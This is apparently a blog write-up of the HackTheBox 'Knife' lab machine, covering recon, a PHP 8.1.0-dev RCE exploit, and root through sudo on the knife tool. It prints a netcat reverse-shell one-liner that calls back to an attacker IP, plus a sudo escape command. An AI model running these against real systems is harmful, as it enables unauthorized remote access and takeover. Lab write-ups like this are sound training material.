---
title: HackTheBox[KNIFE]
author: Anurag M
date: 2021-08-29 02:20:00 +0800
categories: [HackTheBox]
tags: [ "hackthebox", "sudo", "knife", "php" ]
cover : "https://imgur.com/h7ArCGl"
useRelativeCover : true
---
# Knife
## About The Room

| Machine | Difficulty | Creator |
|---------|------------|---------|
| [Knife](https://www.hackthebox.eu/home/machines/profile/347) | Easy | [MrKN16H7](https://www.hackthebox.eu/home/users/profile/98767) |

## Reconnaissance
### Nmap
```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
└──╼ $nmap -A -v 10.10.10.242                                                                           
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
From the Nmap scan, we can see that 2 ports are open. Port 22 and 80, which are standard SSH, HTTP ports respectively. Port 22 ie, SSH port needs a username and password, we do not have that (assuming brute force is not an option).
Port 80 is for web applications. We can find something interesting in port 80, HTTP methods.
You can read more about OPTIONS method [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS)

Since this is related to HTTP methods, we can use the `curl` command-line program to issue an OPTION request.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
└──╼ $curl -X OPTIONS http://10.10.10.242 -i
HTTP/1.1 200 OK
Date: Mon, 24 May 2021 00:20:43 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```
We have an interesting information for `X-Powered-By`

`X-Powered-By: PHP/8.1.0-dev`

We have an impressive PHP bug, a quick reserch on google, we could find that it is vulnerable to Remote Code Execution. The exploit is availble in [exploit db](https://www.exploit-db.com/).

Download the [Exploit](https://www.exploit-db.com/exploits/49933)

![](https://imgur.com/wiBiXCz)

##Gaining foothold

Let's use the exploit. It will ask us for the target URL, as we append the target URL in the exploit, we will get shell as user.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
└──╼ $python3 exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```
We do not have a stable shell. Let's take a reliable reverse shell.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
└──╼ $python3 exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f
```

Start netcat listener on the specified port, we get a reliable reverse shell. Upgrade to a stable shell.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/HTB/LAB/knife]
└──╼ $nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.242] 48310
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("bin/bash")'
james@knife:/$ export TERM=xterm
export TERM=xterm
james@knife:/$ 
```
we can find the user flag under the directory `/home/james`

```bash
james@knife:~$ pwd
pwd
/home/james
james@knife:~$ ls
ls
user.txt
james@knife:~$ 
```

## Privilege Escalation

Let's move forward, checking sudo rights we can find that user `james` is allowed to run /usr/bin/knife as root.
```bash
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:~$ 
```
Let's see what [gtfobi](https://gtfobins.github.io) have to say about `knife`

![](https://imgur.com/oi5WKOu)

Let's get the root shell

```bash
james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'                               
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# id
id
uid=0(root) gid=0(root) groups=0(root)
# 
```
Root flag can be found under the directory `/root`

```bash
# cd /root
cd /root
# ls
ls
delete.sh  root.txt  snap
# 
```

##Resources

| Topic | Url |
|-------|-----|
| HTTP OPTION Methods | [Click here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS) |
| Exploit | [Click here](https://www.exploit-db.com/exploits/49933) |
| GTFOBins | [Click here](https://gtfobins.github.io/gtfobins/knife/#sudo) |
